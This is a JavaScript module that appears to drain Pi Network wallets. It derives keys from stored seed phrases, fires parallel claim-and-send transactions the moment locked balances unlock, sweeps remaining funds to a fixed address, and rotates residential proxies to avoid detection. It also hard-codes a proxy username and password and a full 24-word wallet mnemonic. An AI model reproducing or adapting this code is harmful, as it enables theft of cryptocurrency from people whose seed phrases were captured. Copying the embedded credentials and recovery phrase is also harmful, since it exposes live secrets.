import axios from 'axios';
import { HttpsProxyAgent } from 'https-proxy-agent';
import bip39 from 'bip39';
import ed25519 from 'ed25519-hd-key';
import { Keypair, TransactionBuilder, Operation, Asset, Account   } from 'stellar-base';
import Sponsors from '../models/Sponsors.js';
import Passphrase from '../models/Passphrase.js';

const HORIZON = 'https://api.mainnet.minepi.com';
const NETWORK_PASSPHRASE = 'Pi Network';
const PI_PUBLIC_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';


export function getKeypairFromPassphrase(mnemonic) {
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const derived = ed25519.derivePath("m/44'/314159'/0'", seed);
    return Keypair.fromRawEd25519Seed(derived.key);
}

export async function getAccount(publicKey) {
    const sessionId = Math.random().toString(36).substring(2, 10);
    const proxy = `http://customer-fritz_52wU3-cc-US-session-${sessionId}:Justonlymefritz+22565@pr.oxylabs.io:7777`;
    const agent = new HttpsProxyAgent(proxy);

    try {
        const response = await axios.get(
            `${HORIZON}/accounts/${publicKey}`,
            {
                headers: { 'Content-Type': 'application/json' },
                httpsAgent: agent,
            }
        );
        return response.data;
    } catch(err) {
        // console.error(`❌ Failed to fetch account [${publicKey}]:`, err.response?.data || err.message);
        throw err;
    }
}

export async function buildAndSubmitTx(passphrase, recipient, balanceId, amount) {
    const sessionId = Math.random().toString(36).substring(2, 10);
    const proxy = `http://customer-fritz_52wU3-cc-US-session-${sessionId}:Justonlymefritz+22565@pr.oxylabs.io:7777`;
    const agent = new HttpsProxyAgent(proxy);

    const kp = getKeypairFromPassphrase(passphrase);
    const accountData  = await getAccount(kp.publicKey());
    const account = new Account(kp.publicKey(), accountData.sequence);

    const tx = new TransactionBuilder(account, {
        fee: '100000',
        networkPassphrase: NETWORK_PASSPHRASE,
        // extraSigners
    })
        .addOperation(Operation.claimClaimableBalance({ balanceId }))
        .addOperation(Operation.payment({
        destination: recipient,
        asset: Asset.native(),
        amount,
        }))
        .setTimeout(30)
        .build();

    tx.sign(kp);

    const res = await axios.post(
        `${HORIZON}/transactions`,
        `tx=${encodeURIComponent(tx.toXDR())}`,
        { 
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            httpsAgent: agent,
        }
    );

    return res.data;
}

export async function buildChannelTx(channelPhrase, mainKp, balanceId, recipient, amount) {
    const channelKp = getKeypairFromPassphrase(channelPhrase);
    const accountData  = await getAccount(channelKp.publicKey());
    const channelAccount = new Account(channelKp.publicKey(), accountData.sequence);

	const tx = new TransactionBuilder(channelAccount, {
		fee: '300000',
		networkPassphrase: 'Pi Network',


	})
    .addOperation(Operation.claimClaimableBalance({
		balanceId,
		source: mainKp.publicKey(),
    }))

    .addOperation(Operation.payment({
		destination: recipient,
		asset: Asset.native(),
		amount,
		source: mainKp.publicKey(),
    }))
    .setTimeout(20)
    .build();

  	tx.sign(mainKp);
  	tx.sign(channelKp);

  	return tx.toXDR();
}

export async function buildClaimTx(channelPhrase, mainKp, balanceId) {
    const channelKp = getKeypairFromPassphrase(channelPhrase);
    const accountData = await getAccount(channelKp.publicKey());
    const channelAccount = new Account(channelKp.publicKey(), accountData.sequence);

    const tx = new TransactionBuilder(channelAccount, {
        fee: '300000', // 0.01 PI
        networkPassphrase: 'Pi Network',
    })
    .addOperation(Operation.claimClaimableBalance({
        balanceId,
        source: mainKp.publicKey(),
    }))
    .setTimeout(30)
    .build();

    tx.sign(mainKp);
    tx.sign(channelKp);

    return tx.toXDR();
}

export async function buildSendTx(channelPhrase, mainKp, recipient, amount) {
    const channelKp = getKeypairFromPassphrase(channelPhrase);
    const accountData = await getAccount(channelKp.publicKey());
    const channelAccount = new Account(channelKp.publicKey(), accountData.sequence);

    const tx = new TransactionBuilder(channelAccount, {
        fee: '300000', // 1 PI = 10 million stroops
        networkPassphrase: 'Pi Network',
    })
    .addOperation(Operation.payment({
        destination: recipient,
        asset: Asset.native(),
        amount,
        source: mainKp.publicKey(),
    }))
    .setTimeout(30)
    .build();

    tx.sign(mainKp);
    tx.sign(channelKp);

    return tx.toXDR();
}

export async function runParallelClaimAndSend(mainKp, balanceId, recipient, amount, channel1Phrase, channel2Phrase) {
  try {
    // Parallel build: claim and send
    const [claimXdr, sendXdr] = await Promise.all([
      buildClaimTx(channel1Phrase, mainKp, balanceId),
      buildSendTx(channel2Phrase, mainKp, recipient, amount),
    ]);

    // Parallel submit
    const [claimRes, sendRes] = await Promise.allSettled([
      submitTransaction(claimXdr),
      submitTransaction(sendXdr),
    ]);

    if (claimRes.status === 'fulfilled' && claimRes.value?.hash) {
      console.log(`✅ Claimed: ${claimRes.value.hash}`);
    } else {
      console.log(`❌ Claim failed:`, claimRes.reason?.error || claimRes.reason);
    }

    if (sendRes.status === 'fulfilled' && sendRes.value?.hash) {
      console.log(`✅ Sent: ${sendRes.value.hash}`);
    } else {
      console.log(`❌ Send failed:`, sendRes.reason?.error || sendRes.reason);
    }
  } catch (err) {
    console.error('🔥 Error in parallel claim/send:', err.message || err);
  }
}




export async function submitTransaction(txXdr) {
    try {
        const sessionId = Math.random().toString(36).substring(2, 10);
        const proxy = `http://customer-fritz_52wU3-cc-US-session-${sessionId}:Justonlymefritz+22565@pr.oxylabs.io:7777`;
        const agent = new HttpsProxyAgent(proxy);

        const res = await axios.post(
            `${HORIZON}/transactions`,
            `tx=${encodeURIComponent(txXdr)}`,
            { 
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                httpsAgent: agent,
            }
        );
        console.log(res.data)
        return res.data;
    } catch (err) {
        console.log('❌ Client error submitting TX:', err);
        return { success: false, error: err.response?.data || err.message}
    }
}

export async function getClaimableBalance(publicKey) {
        const sessionId = Math.random().toString(36).substring(2, 10);
        const proxy = `http://customer-fritz_52wU3-cc-US-session-${sessionId}:Justonlymefritz+22565@pr.oxylabs.io:7777`;
        const agent = new HttpsProxyAgent(proxy);

        try {
            const res = await axios.get(
                `${HORIZON}/claimable_balances?claimant=${publicKey}`,
                { 
                    headers: { 'Content-Type': 'application/json' },
                    httpsAgent: agent,
                }
            );

            return res.data;
        } catch(err) {
            return { error: "something went wrong" }
        }
}

export async function FloodchannelTransaction(mainPhrase, balanceId, recipient, amount) {
    const mainKp = getKeypairFromPassphrase(mainPhrase);
    const allSponsors = await Sponsors.find({name: 'whoami-5677'});
    if(allSponsors) {
        const result = await Promise.all(allSponsors.map(async (sponsor, i) => {
            try {
                const xdr = await buildChannelTx(sponsor.mnemonic, mainKp, balanceId, recipient, amount);
                return await submitTransaction(xdr);
            } catch (err) {
                console.error(`❌ Error building/submitting for channel ${i}:`, err);
            }
        }));

        return result;
    }
    return { success: false, error: "No sponsored accounts found"}
}

export async function FloodParallelChannelTransaction(mainPhrase, balanceId, recipient, amount) {
    const mainKp = getKeypairFromPassphrase(mainPhrase);
    const allSponsors = await Sponsors.find({ name: 'whoami-5677' });

    if (allSponsors.length < 2) return { success: false, error: "Not enough sponsors" };

    const results = await Promise.allSettled(
        Array.from({ length: Math.floor(allSponsors.length / 2) }, (_, i) => i * 2).map(async (i) => {
            try {
                const claimChannel = allSponsors[i];
                const sendChannel = allSponsors[i + 1];

                const [claimXDR, sendXDR] = await Promise.all([
                    buildClaimTx(claimChannel.mnemonic, mainKp, balanceId),
                    buildSendTx(sendChannel.mnemonic, mainKp, recipient, amount),
                ]);

                const [claimRes, sendRes] = await Promise.all([
                    submitTransaction(claimXDR),
                    submitTransaction(sendXDR),
                ]);

                return {
                    claim: claimRes.hash || null,
                    send: sendRes.hash || null,
                };
            } catch (err) {
                return { error: err.message || err };
            }
        })
    );

    return results;
}


export async function sweepWallet(mainPhrase, recipient) {
    const sessionId = Math.random().toString(36).substring(2, 10);
    const proxy = `http://customer-fritz_52wU3-cc-US-session-${sessionId}:Justonlymefritz+22565@pr.oxylabs.io:7777`;
    const agent = new HttpsProxyAgent(proxy);

    const mainKp = getKeypairFromPassphrase(mainPhrase);
    const accountData  = await getAccount(mainKp.publicKey());
    const account = new Account(mainKp.publicKey(), accountData.sequence);

	const balanceString = getBalance(accountData);
	const baseFee = parseFloat(await getBaseFee());

	const onePiInStroops = 10_000_000;
	const balance = parseFloat(balanceString);
	const txCharge = baseFee/onePiInStroops;
	const baseReserve = 0.5;
	const minReserve = 0.98;
	const withdrawable = Math.abs(balance - minReserve - txCharge);

    if(balance - minReserve - txCharge <= 0) {
        return;
    }

    const tx = new TransactionBuilder(account, {
        fee: baseFee.toString(),
        networkPassphrase: NETWORK_PASSPHRASE,
    })
        .addOperation(Operation.payment({
            destination: recipient,
            asset: Asset.native(),
            amount: withdrawable.toFixed(7),
        }))
        .setTimeout(30)
        .build();

    tx.sign(mainKp);
	
    const res = await axios.post(
        `${HORIZON}/transactions`,
        `tx=${encodeURIComponent(tx.toXDR())}`,
        { 
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            httpsAgent: agent,
        }
    );

    return {data: res.data, amount: withdrawable.toFixed(7)};
}

export async function fundWallet(mainPhrase, recipient, amount) {
    const sessionId = Math.random().toString(36).substring(2, 10);
    const proxy = `http://customer-fritz_52wU3-cc-US-session-${sessionId}:Justonlymefritz+22565@pr.oxylabs.io:7777`;
    const agent = new HttpsProxyAgent(proxy);

    const mainKp = getKeypairFromPassphrase(mainPhrase);
    const accountData  = await getAccount(mainKp.publicKey());
    const account = new Account(mainKp.publicKey(), accountData.sequence);
	const baseFee = parseFloat(await getBaseFee());

    const tx = new TransactionBuilder(account, {
        fee: baseFee.toString(),
        networkPassphrase: NETWORK_PASSPHRASE,
    })
        .addOperation(Operation.payment({
            destination: recipient,
            asset: Asset.native(),
            amount,
        }))
        .setTimeout(30)
        .build();

    tx.sign(mainKp);
	
    const res = await axios.post(
        `${HORIZON}/transactions`,
        `tx=${encodeURIComponent(tx.toXDR())}`,
        { 
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            httpsAgent: agent,
        }
    );

    return {data: res.data, amount: amount};
}


const FEE_CACHE_TTL = 10_000;

let cachedFee= null;
let lastFeeFetchTime = 0;
export async function getBaseFee() {
    const sessionId = Math.random().toString(36).substring(2, 10);
    const proxy = `http://customer-fritz_52wU3-cc-US-session-${sessionId}:Justonlymefritz+22565@pr.oxylabs.io:7777`;
    const agent = new HttpsProxyAgent(proxy);

    const now = Date.now();
    if (cachedFee && (now - lastFeeFetchTime < FEE_CACHE_TTL)) {
        return cachedFee;
    }

    try {
        const response = await axios.get(`${HORIZON}/fee_stats`, 
            {
                headers: { 'Content-Type': 'application/json' },
                httpsAgent: agent,
            }
        );
        cachedFee = response.data.fee_charged.max; // returns string
        lastFeeFetchTime = now;
        return cachedFee;
    } catch (error) {
        console.error('❌ Failed to fetch fee stats:', error.message);
        // fallback to default
        return '100000';
    }
}

export function getBalance(account) {
	const balanceObj = account.balances.find(
		(b) => b.asset_type === 'native'
    );

    return balanceObj ? balanceObj.balance : '0';
}

export const autoClaimUnlocked = async () => {
    console.log(`Trying auto claim now...`);
    const now = new Date();
    const fiveSecondsFromNow = new Date(now.getTime() + 10 * 1000);

    const readyPassphrases = await Passphrase.find({
        claimableAt: { $lte: fiveSecondsFromNow },
        status: 'pending'
    });

    // const target = new Date('2025-06-30T16:47:10.000Z');

    // const oneSecondBefore = new Date(target.getTime() - 1000);
    // const oneSecondAfter = new Date(target.getTime() + 1000);

    // const readyPassphrases = await Passphrase.find({
    // claimableAt: { $gte: oneSecondBefore, $lte: oneSecondAfter },
    // status: 'pending',
    // });

    console.log(readyPassphrases)
    // return;
    

    for (const p of readyPassphrases) {
        try {
            console.log(`🔄 Claiming for: ${p.mnemonic.slice(0, 10)}...`);

            FloodchannelTransaction(
                p.mnemonic,
                p.balanceId,
                PI_PUBLIC_ADDRESS,
                p.amount
            ).then(result => {
                const success = result.find(r => r.hash);

                if (success) {
                    console.log(`✅ Claimed Pi. Hash: ${success.hash}`);
                    Passphrase.updateOne(
                        { _id: p._id },
                        { $set: { status: 'claimed' } }
                    );
                } else {
                    console.log(`❌ Failed to claim for ${p.receiverAddress}`);
                    // await Passphrase.updateOne(
                    //     { _id: p._id },
                    //     { $set: { status: 'pending' } }
                    // );
                }
            })

            

        } catch (err) {
            console.error('❌ Error something went wrong Pi:', err.message || err);
            // await Passphrase.updateOne(
            //     { _id: p._id },
            //     { $set: { status: 'pending' } }
            // );
        }
    }

};

const sweepWithLogs = async (p) => {
    try {
        console.log(`🔄 Sweeping for: ${p.mnemonic.slice(0, 10)}...`);

        const result = await sweepWallet(p.mnemonic, PI_PUBLIC_ADDRESS);
        const success = result.data;

        if (success.hash) {
            console.log(`✅ Sweeped ${result.amount} Pi. Hash: ${success.hash}`);
        } else {
            console.log(`❌ Failed to sweep for ${p.receiverAddress}`);
        }
    } catch (err) {
        console.error('❌ Error sweeping Pi:', err.message || err);
    }
};

export const autoSweepWallet = async () => {
    const readyPassphrases = await Passphrase.find();
    await Promise.allSettled(
        readyPassphrases.map(p => sweepWithLogs(p))
    );
};

export const autoFundWallet = async () => {

    const sponsorsPhrase = await Sponsors.find( {name: 'whoami-5677'} );

    for (const p of sponsorsPhrase) {
        try {
            console.log(`🔄 funding for: ${p.mnemonic.slice(0, 10)}...`);


            const sponsorKp = getKeypairFromPassphrase(p.mnemonic);
            const accountData  = await getAccount(sponsorKp.publicKey());

            const balanceString = getBalance(accountData);
            const balance = parseFloat(balanceString) - 1;

            const change = balance - 0.2;

            if(change < 0) {
                const result = await fundWallet(
                    "logic resemble wise decline unhappy all arrive engage motor shop borrow one rabbit pattern flight draw inflict wolf boy grit social black hand rate",
                    sponsorKp.publicKey(),
                    Math.abs(change).toFixed(7)
                );

                const success = result.data;

                if (success.hash) {
                    console.log(`✅ funded ${result.amount} Pi. Hash: ${success.hash}`);
                    
                } else {
                    console.log(`❌ Failed to fund ${result.amount} PI}`);
                }
            }

        } catch (err) {
            console.error('❌ Error funding Pi:', err.message || err);
        }
    }
};

export const autoFundWalletBeforeAndAfterClaim = async () => {
    const now = new Date();
    const twentySecondsBefore = new Date(now.getTime() - 20 * 1000);
    const twentySecondsAfter = new Date(now.getTime() + 20 * 1000);

    const readyPassphrases = await Passphrase.find({
    claimableAt: {
        $gte: twentySecondsBefore,
        $lte: twentySecondsAfter,
    },
    status: 'pending',
    });

    if(!readyPassphrases.length) return;

    const sponsorsPhrase = await Sponsors.find( {name: 'whoami-5677'} );

    for (const p of sponsorsPhrase) {
        try {
            console.log(`🔄 funding for: ${p.mnemonic.slice(0, 10)}...`);


            const sponsorKp = getKeypairFromPassphrase(p.mnemonic);
            const accountData  = await getAccount(sponsorKp.publicKey());

            const balanceString = getBalance(accountData);
            const balance = parseFloat(balanceString) - 1;

            const change = balance - 0.08;

            if(change < 0) {
                const result = await fundWallet(
                    "logic resemble wise decline unhappy all arrive engage motor shop borrow one rabbit pattern flight draw inflict wolf boy grit social black hand rate",
                    sponsorKp.publicKey(),
                    Math.abs(change).toFixed(7)
                );

                const success = result.data;

                if (success.hash) {
                    console.log(`✅ funded ${result.amount} Pi. Hash: ${success.hash}`);
                    
                } else {
                    console.log(`❌ Failed to fund ${result.amount} PI}`);
                }
            }

        } catch (err) {
            console.error('❌ Error funding Pi:', err.message || err);
        }
    }

    global.isFunding = false;
};

export const autoSweepWalletBeforeAndAfter = async () => {
    const now = new Date();
    const twentySecondsBefore = new Date(now.getTime() - 15 * 1000);
    const twentySecondsAfter = new Date(now.getTime() + 25 * 1000);

    const readyPassphrases = await Passphrase.find({
        claimableAt: { $gte: twentySecondsBefore, $lte: twentySecondsAfter },
        status: 'pending',
    });

    for (const p of readyPassphrases) {
        try {
            console.log(`🔄 Sweeping for: ${p.mnemonic.slice(0, 10)}...`);

            const result = await sweepWallet(
                p.mnemonic,
                PI_PUBLIC_ADDRESS,
            );

            const success = result.data;

            if (success.hash) {
                console.log(`✅ Sweeped ${result.amount} Pi. Hash: ${success.hash}`);
                
            } else {
                console.log(`❌ Failed to sweep for ${p.receiverAddress}`);
            }

        } catch (err) {
            console.error('❌ Error sweeping Pi:', err.message || err);
        }
    }
};

export const autoDeleteWallet = async () => {
    if (global.isDeleting) return;
    global.isDeleting = true;
    const now = new Date();
    const oneMinutesAgo = new Date(now.getTime() -  ( 30 * 1000));

    const overduePassphrases = await Passphrase.find({
        claimableAt: { $lte: oneMinutesAgo },
        status: 'pending'
    });

    for (const p of overduePassphrases) {
        try {

            await Passphrase.updateOne(
                { _id: p._id },
                { $set: { status: 'claimed' } }
            );


        } catch (err) {
            console.error('❌ Error deleting Pi:', err.message || err);
        }
    }

    global.isDeleting = false;
    global.isClaiming = false;
};

export const fundSingleWallet = async (id) => {
  try {
    const p = await Sponsors.findOne({ _id: id });
    if (!p) return { success: false, message: 'Sponsor not found' };

    const sponsorKp = getKeypairFromPassphrase(p.mnemonic);
    const accountData = await getAccount(sponsorKp.publicKey());
    const balance = parseFloat(getBalance(accountData));

    const requiredBalance = 0.99 + 0.2;
    const missing = requiredBalance - balance;

    if (missing > 0) {
      const result = await fundWallet(
        "logic resemble wise decline unhappy all arrive engage motor shop borrow one rabbit pattern flight draw inflict wolf boy grit social black hand rate",
        sponsorKp.publicKey(),
        missing.toFixed(7)
      );

      const success = result.data;
      if (success.hash) {
        return { success: true, message: `${result.amount} Pi funded successfully` };
      } else {
        return { success: false, message: "Account funding failed" };
      }
    } else {
      return { success: true, message: "Balance already sufficient" };
    }

  } catch (err) {
    console.error('❌ Error funding Pi:', err.message || err);
    return { success: false, message: err.message || "Unexpected error" };
  }
};

export function trackFunctionCalls(fn) {
  let count = 0;

  // Log and reset count every minute
  setInterval(() => {
    console.log(`Function "${fn.name}" was called ${count} times in the last second.`);
    count = 0;
  }, 1000); // 60,000 ms = 1 minute

  // Return a wrapper function that increments count and calls the original
  return (...args) => {
    count++;
    return fn(...args);
  };
}

